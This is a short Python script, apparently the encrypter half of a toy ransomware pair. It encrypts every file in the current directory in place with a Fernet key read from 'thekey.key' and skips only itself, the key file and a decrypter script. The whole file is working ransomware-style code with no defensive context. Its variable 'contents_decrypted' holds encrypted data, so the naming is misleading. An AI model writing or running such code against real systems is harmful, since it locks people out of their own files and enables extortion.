import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if file == "Encrypter.py" or file == "thekey.key" or file == "Decrypter.py":
        continue
    if os.path.isfile(file):
        files.append(file)

with open("thekey.key", "rb") as key:
    secretkey = key.read()

for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_decrypted = Fernet(secretkey).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_decrypted)